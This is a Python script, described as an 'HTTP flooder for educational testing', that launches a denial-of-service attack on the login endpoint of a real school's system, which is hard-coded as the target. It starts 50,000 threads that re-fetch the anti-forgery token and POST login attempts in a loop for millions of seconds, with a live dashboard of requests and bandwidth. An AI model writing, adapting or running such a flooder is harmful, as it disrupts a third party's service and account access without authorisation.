#!/usr/bin/env python3
"""
HTTP flooder for educational testing.
First fetches the login page to get a fresh __RequestVerificationToken,
then POSTs to the LoginAD endpoint in a tight loop.
"""

import requests
import threading
import time
import queue
import collections
import sys
from bs4 import BeautifulSoup
import random

# shared statistics
stats = {
    "requests": 0,
    "bandwidth": 0,      # bytes received
    "statuses": queue.deque(maxlen=100),
    "errors": queue.deque(maxlen=10),
    "resp_times": queue.deque(maxlen=100),  # response times in seconds
    "pending_requests": 0,  # number of requests in progress
}
stats_lock = threading.Lock()
rpm_window = collections.deque(maxlen=60)
threads_started = 0

def fetch_token(session: requests.Session, page_url: str, timeout: float) -> str:
    """
    GET the login page at page_url, parse out the hidden token
    """
    resp = session.get(page_url, timeout=timeout)
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "__RequestVerificationToken"})
    if not token_input:
        raise RuntimeError("Could not find __RequestVerificationToken on login page")
    return token_input["value"]

def flood_target(login_page: str,
                 login_action: str,
                 duration: float,
                 timeout: float,
                 username: str,
                 password: str):
    """
    Repeatedly POST to login_action, but always re-fetch the token
    by GET-ing login_page first.
    """
    session = requests.Session()
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            # replace the GET to the POST‐only URL with a GET to the actual login page
            token = fetch_token(session, login_page, timeout)

            payload = {
                "__RequestVerificationToken": token,
                "Username": username,
                "Password": password,
            }
            with stats_lock:
                stats["pending_requests"] += 1
            start_time = time.time()
            resp = session.post(login_action, data=payload, timeout=timeout)
            elapsed = time.time() - start_time

            # record stats
            content_len = len(resp.content)
            with stats_lock:
                stats["requests"]  += 1
                stats["bandwidth"] += content_len
                stats["statuses"].append(resp.status_code)
                stats["resp_times"].append(elapsed)
                stats["pending_requests"] -= 1

        except Exception as err:
            with stats_lock:
                stats["errors"].append(f"[{threading.current_thread().name}] {err}")
                stats["statuses"].append("ERR")
                stats["pending_requests"] -= 1
            time.sleep(random.uniform(0.5, 1.5))

def dashboard(thread_count: int, duration: float):
    """
    Clear-screen dashboard printed once per second.
    """
    start = time.time()
    last_req = 0
    last_bw  = 0

    while time.time() - start < duration:
        time.sleep(1)
        with stats_lock:
            curr_req   = stats["requests"]
            curr_bw    = stats["bandwidth"]
            rpm_window.append(curr_req - last_req)
            last_req   = curr_req

            rpm        = sum(rpm_window) * (60 / len(rpm_window))
            total_mb   = curr_bw / (1024 * 1024)
            per_s_mb   = (curr_bw - last_bw) / (1024 * 1024)
            last_bw    = curr_bw

            status_dist = collections.Counter(stats["statuses"])
            errors      = list(stats["errors"])
            resp_times  = list(stats["resp_times"])
            avg_resp    = sum(resp_times) / len(resp_times) if resp_times else 0
            pending     = stats["pending_requests"]

        sys.stdout.write("\033c")
        print("=== Dashboard ===")
        print(f"Threads target       : {thread_count}")
        print(f"Threads started      : {threads_started}")
        print(f"Total requests       : {curr_req}")
        print(f"Requests per minute  : {int(rpm)}")
        print(f"Total bandwidth (MB) : {total_mb:.2f}")
        print(f"Bandwidth/s (MB)     : {per_s_mb:.2f}")
        print(f"Avg response time (s): {avg_resp:.3f}")
        print(f"Pending requests     : {pending}")
        print("Top status codes     :")
        for code, cnt in status_dist.most_common(5):
            print(f"  {code} → {cnt}")
        print("Recent errors (up to 10):")
        if errors:
            for e in errors:
                print(" ", e)
        else:
            print("  None")

def main():
    # configuration
    LOGIN_PAGE    = "https://sms.kvis.ac.th/"                    # where the form lives
    LOGIN_ACTION  = "https://sms.kvis.ac.th/Signin/LoginAD"      # where the form POSTS
    THREAD_COUNT  = 50000
    DURATION      = 8000000   # seconds
    TIMEOUT       = 100
    USERNAME      = "00591"
    PASSWORD      = "your_password"

    global threads_started
    print(f"Starting POST flood: {THREAD_COUNT} threads for {DURATION} seconds")

    # start dashboard thread
    dash = threading.Thread(
        target=dashboard,
        args=(THREAD_COUNT, DURATION),
        daemon=True
    )
    dash.start()

    # start worker threads
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(
            target=flood_target,
            name=f"Worker-{i+1}",
            args=(LOGIN_PAGE, LOGIN_ACTION, DURATION, TIMEOUT, USERNAME, PASSWORD),
            daemon=True
        )
        threads.append(t)
        t.start()
        threads_started += 1
        time.sleep(0.01)

    for t in threads:
        t.join()

    print("Flood complete")

if __name__ == "__main__":
    main()
